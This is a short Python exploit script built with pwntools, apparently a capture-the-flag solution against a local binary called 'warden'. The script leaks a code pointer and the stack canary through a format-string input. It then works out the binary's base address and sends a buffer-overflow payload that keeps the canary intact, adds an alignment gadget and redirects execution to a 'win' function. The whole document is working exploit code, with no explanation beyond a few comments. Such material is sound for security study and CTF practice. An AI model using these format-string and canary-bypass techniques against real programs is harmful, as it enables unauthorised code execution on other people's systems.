from pwn import *
context.arch = 'i386'
context.log_level = 'debug'

p = process('./warden')
p.recvuntil(b'My defense is too solid to be breached.\n')

# Leak
p.sendline(b'%3$08x|%15$08x')
output = p.recvuntil(b'Pow Pow Pow\n')
values = output.split(b'Pow')[0].strip().split(b'|')
code_leak = int(values[0], 16)
canary = int(values[1], 16)

base = code_leak - 0x1433
braum = base + 0x12cd
win = base + 0x1324
ret = base + 0x1023

print(f"Base: {hex(base)}, Canary: {hex(canary)}")

# Test with alignment
payload = b'A' * 32
payload += p32(canary)
payload += p32(0)
payload += p32(0)
payload += p32(ret)  # Extra ret for alignment
payload += p32(win)
payload += p32(0)
payload += p32(0x123)

p.sendline(payload)
sleep(1)
output = p.recvrepeat(timeout=1)
print("Output:", output)
p.close()
